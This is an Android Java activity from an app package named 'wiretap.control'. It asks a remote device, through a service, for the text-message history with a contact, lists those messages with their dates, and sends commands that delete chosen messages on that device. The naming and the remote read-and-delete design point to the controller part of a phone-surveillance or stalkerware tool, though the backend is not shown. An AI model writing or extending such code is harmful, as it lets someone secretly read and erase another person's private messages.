package com.pgw.wiretap.control;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Map;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnLongClickListener;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import com.alibaba.fastjson.JSONObject;
import com.pgw.wiretap.control.domain.MsgType;
import com.pgw.wiretap.control.domain.MyBaseAdapter;
import com.pgw.wiretap.control.domain.SmsInfo;
import com.pgw.wiretap.control.myadapter.ConfimDialogAdapter;
import com.pgw.wiretap.control.utils.DialogUtils;
import com.pgw.wiretap.control.utils.JsonUtils;
import com.pgw.wiretap.control.utils.MsgUtils;

public class SmsListActivity extends BaseActivity {
	private ListView lv_list;
	private TextView tv_title;
	private LinearLayout ll_loading;
	private List<SmsInfo> smsList;
	private String smsg;
	private String getter;
	private String address;
	private String name;
	public static final String TAG="SmsListActivity";
	private SmsInfo smsInfo;
	private MyAdapter adapter;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_sms_list);

		address = getIntent().getStringExtra("address");
		name = getIntent().getStringExtra("name");
		getter = getIntent().getStringExtra("getter");

		MsgUtils.sendToService(getApplicationContext(), getter,
				MsgType.READ_SMS_LIST, address);

		lv_list = (ListView) findViewById(R.id.lv_sms_list_view);
		tv_title = (TextView) findViewById(R.id.tv_title);
		ll_loading = (LinearLayout) findViewById(R.id.ll_loading);
		ll_loading.setVisibility(View.VISIBLE);
		tv_title.setText(name != null ? name : address);
	}

	@Override
	protected void receive(int type, String data) {
		if (type == MsgType.SMS_LIST) {
			// 短息列表
			ll_loading.setVisibility(View.GONE);
			smsList = JsonUtils.json2list(data, SmsInfo.class);
			adapter=new MyAdapter();
			lv_list.setAdapter(adapter);
		}else if(type == MsgType.DEL_SMS_SUCCESS){
			smsList.remove(smsInfo);
			adapter.notifyDataSetChanged();
		}
	}

	private class MyAdapter extends MyBaseAdapter {

		@Override
		public int getCount() {
			return smsList.size();
		}

		@Override
		public View getView(final int postion, View contentView, ViewGroup arg2) {
			 smsInfo = smsList.get(postion);
			View view;
			ClassHolder holder;
			if (contentView != null && contentView instanceof LinearLayout) {
				view = contentView;
				holder = (ClassHolder) view.getTag();
			} else {
				if (smsInfo.getType() == 1) {
					view = View.inflate(getApplicationContext(),
							R.layout.list_item_sms_other, null);
				} else {
					view = View.inflate(getApplicationContext(),
							R.layout.list_item_sms_self, null);
				}
				holder = new ClassHolder();
				holder.tv_username = (TextView) view
						.findViewById(R.id.tv_username);
				holder.tv_body = (TextView) view.findViewById(R.id.tv_body);
				holder.tv_date = (TextView) view.findViewById(R.id.tv_date);
				view.setTag(holder);
				// 注册长按事件
				view.setOnClickListener(new OnClickListener() {
					@Override
					public void onClick(View v) {
						SmsInfo smsInfo = smsList.get(postion);
						showOptListDialog();
					}
				});
			}

			if (smsInfo.getType() == 1) {
				holder.tv_username.setText(name != null ? name : address);
			} else {
				holder.tv_username.setText("我");
			}
			holder.tv_body.setText(smsInfo.getBody());
			long date = smsInfo.getDate();
			String strDate = new SimpleDateFormat("yy-MM-dd HH:mm:ss")
					.format(new Date(date));
			holder.tv_date.setText(strDate);

			return view;
		}

		/**
		 * 显示操作对话框
		 */
		protected void showOptListDialog() {
			CharSequence[] items = { "删除", "编辑" };
			DialogUtils.showItems(SmsListActivity.this, "请选择以下操作：", items,
					new DialogInterface.OnClickListener() {
						@Override
						public void onClick(DialogInterface dialog, int which) {
							switch (which) {
							case 0:// 删除短信
								delSms();
								break;
							case 1:// 编辑短信
								Toast.makeText(getApplicationContext(), "编辑短信",
										1).show();
								break;
							}

						}
					});

		}

		/**
		 * 删除短信
		 */
		protected void delSms() {
			DialogUtils.showConfirm(SmsListActivity.this, "提醒", "你确定要删除这条信息吗？",
					new ConfimDialogAdapter() {
						@Override
						public void onConifm(DialogInterface dialog) {
							Log.v(TAG, "删除短信：" + smsInfo);
							MsgUtils.sendToService(getApplicationContext(),
									getter, MsgType.DEL_SMS_ID,
									new String[] { String.valueOf(smsInfo
											.getId()) });
						};
					});

		}

	}

	private class ClassHolder {
		TextView tv_username;
		TextView tv_body;
		TextView tv_date;

	}

}
